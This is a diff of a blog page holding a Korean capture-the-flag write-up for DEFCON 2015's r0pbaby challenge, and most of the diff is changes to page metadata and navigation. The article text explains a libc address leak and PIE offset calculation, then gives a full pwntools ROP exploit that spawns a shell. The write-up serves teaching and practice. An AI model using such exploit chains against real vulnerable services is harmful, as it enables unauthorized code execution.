@@ -21,7 +21,7 @@
 <meta property="og:description" content="img.border-shadow{    border:1px solid #888888;    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);} r0pbabyBinary File{: .btn .btn_info}  [바이너리 보호기법 확인][실행 화면 메뉴]   1번">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://j0n9hyun.github.io/j0n9hyun.github.io/images/ctf/defcon/r0pbaby/0.PNG">
-<meta property="og:updated_time" content="2019-05-20T14:58:12.044Z">
+<meta property="og:updated_time" content="2019-05-20T15:18:26.135Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="DEFCON 2015 r0pbaby">
 <meta name="twitter:description" content="img.border-shadow{    border:1px solid #888888;    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);} r0pbabyBinary File{: .btn .btn_info}  [바이너리 보호기법 확인][실행 화면 메뉴]   1번">
@@ -73,7 +73,7 @@
                                     <a class="main-nav-list-link" href="/">Home</a>
                                 </li>
                             
-                                        <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Pwnable/">Pwnable</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Pwnable/Theory/">Theory</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Forensics/">Forensics</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Misc/">Misc</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/hacking/">hacking</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/hacking/security/">security</a></li></ul></li></ul>
+                                        <ul class="main-nav-list"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Pwnable/">Pwnable</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/Pwnable/Theory/">Theory</a></li></ul></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/">WriteUps</a><ul class="main-nav-list-child"><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Forensics/">Forensics</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Misc/">Misc</a></li><li class="main-nav-list-item"><a class="main-nav-list-link" href="/categories/WriteUps/Pwn/">Pwn</a></li></ul></li></ul>
                                     
                                 <li class="main-nav-list-item">
                                     <a class="main-nav-list-link" href="/hueman/about/index.thml">About</a>
@@ -132,7 +132,7 @@
                         <div class="main-body-header">
     <h1 class="header">
     
-    uncategorized
+    <a class="page-title-link" href="/categories/WriteUps/">WriteUps</a><i class="icon fa fa-angle-right"></i><a class="page-title-link" href="/categories/WriteUps/Pwn/">Pwn</a>
     </h1>
 </div>
 
@@ -191,6 +191,7 @@
 <p>libc 주소는 달랐는데 system 주소는 동일하다. 고로 바로 recv 받아서 사용하면 된다. 이후부터는 오프셋 연산을 해주고 RTL 하면 되는데 익스가 안된다…<br>여기서 은근히 시간을 많이 잡아먹었다. 생각해보니 PIE가 걸렸다는 점을 간과하고 있었던 것이다. <strong>PIE</strong>가 걸려있으면 실행할 때마다 가젯 주소가 계속 바뀌기 때문에 libc의 pop rdi ret을 가져와서 오프셋 연산을 해야 한다.<br>3번을 IDA로 확인하면 buffer를 savage라는 곳에다가 옮기는데 이 savage의 위치는 고맙게도 rbp+0h 에 있다. 즉, 바로 버퍼의 바로 뒤에 위치해 있다는 소리다. 고로 buf + sfp[rbp+0h] + RTL[binsh+system]이 들어갈 최종 페이로드가 된다. 이후부터는 스무스하게 슥삭 진행하면 익스 성공!  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./r0pbaby'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">binsh_offset = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">system_offset = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">pr = <span class="number">0x21102</span> <span class="comment"># pop rdi; ret</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"2"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"system"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line">system_addr = int(r.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libc_base = system_addr - system_offset</span><br><span class="line">pr_addr = libc_base + pr</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">": "</span>, <span class="string">"3"</span>)</span><br><span class="line">r.sendline(<span class="string">"32"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span>*<span class="number">8</span></span><br><span class="line">payload += p64(pr_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <center><small>[Exploit Code]</small></center>
+
         </div>
         <footer class="article-footer">
             
@@ -270,10 +271,10 @@
         "headline": "DEFCON 2015 r0pbaby",
         "image": "http://j0n9hyun.github.io/j0n9hyun.github.io/images/ctf/defcon/r0pbaby/0.PNG",
         "keywords": "WriteUps",
-        "genre": "",
+        "genre": "WriteUps Pwn",
         "datePublished": "2019-02-18",
         "dateCreated": "2019-02-18",
-        "dateModified": "2019-05-20",
+        "dateModified": "2019-05-21",
         "url": "http://j0n9hyun.github.io/2019/02/18/2019-02-18-r0pbaby/",
         "description": "  img.border-shadow{    border:1px solid #888888;    box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);}
 r0pbabyBinary File{: .btn .btn_info}
@@ -344,26 +345,6 @@ r0pbabyBinary File{: .btn .btn_info}
         <h3 class="widget-title">recents</h3>
         <div class="widget">
             <ul id="recent-post" class>
-                
-                    <li>
-                        
-                        <div class="item-thumbnail">
-                            <a href="/2019/05/20/test/" class="thumbnail">
-    
-    
-        <span class="thumbnail-image thumbnail-none"></span>
-    
-    
-</a>
-
-                        </div>
-                        
-                        <div class="item-inner">
-                            <p class="item-category"><a class="article-category-link" href="/categories/hacking/">hacking</a><i class="icon fa fa-angle-right"></i><a class="article-category-link" href="/categories/hacking/security/">security</a></p>
-                            <p class="item-title"><a href="/2019/05/20/test/" class="title">test</a></p>
-                            <p class="item-date"><time datetime="2019-05-20T14:54:55.000Z" itemprop="datePublished">2019-05-20</time></p>
-                        </div>
-                    </li>
                 
                     <li>
                         
@@ -445,6 +426,26 @@ r0pbabyBinary File{: .btn .btn_info}
                         </div>
                     </li>
                 
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2019/03/25/2019-03-25-securinet_hidden/" class="thumbnail">
+    
+    
+        <span style="background-image:url(\j0n9hyun.github.io\images\ctf\securinets2019\misc\0.PNG)" alt="Securinets Prequals CTF 2019 HIDDEN" class="thumbnail-image"></span>
+    
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"></p>
+                            <p class="item-title"><a href="/2019/03/25/2019-03-25-securinet_hidden/" class="title">Securinets Prequals CTF 2019 HIDDEN</a></p>
+                            <p class="item-date"><time datetime="2019-03-25T06:41:00.000Z" itemprop="datePublished">2019-03-25</time></p>
+                        </div>
+                    </li>
+                
             </ul>
         </div>
     </div>
@@ -454,7 +455,7 @@ r0pbabyBinary File{: .btn .btn_info}
     <div class="widget-wrap widget-list">
         <h3 class="widget-title">categories</h3>
         <div class="widget">
-            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwnable/">Pwnable</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwnable/Theory/">Theory</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/">WriteUps</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Forensics/">Forensics</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Pwn/">Pwn</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/hacking/">hacking</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hacking/security/">security</a><span class="category-list-count">1</span></li></ul></li></ul>
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwnable/">Pwnable</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Pwnable/Theory/">Theory</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/">WriteUps</a><span class="category-list-count">12</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Forensics/">Forensics</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WriteUps/Pwn/">Pwn</a><span class="category-list-count">6</span></li></ul></li></ul>
         </div>
     </div>
 
@@ -464,7 +465,7 @@ r0pbabyBinary File{: .btn .btn_info}
     <div class="widget-wrap widget-list">
         <h3 class="widget-title">archives</h3>
         <div class="widget">
-            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a><span class="archive-list-count">5</span></li></ul>
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a><span class="archive-list-count">5</span></li></ul>
         </div>
     </div>
 
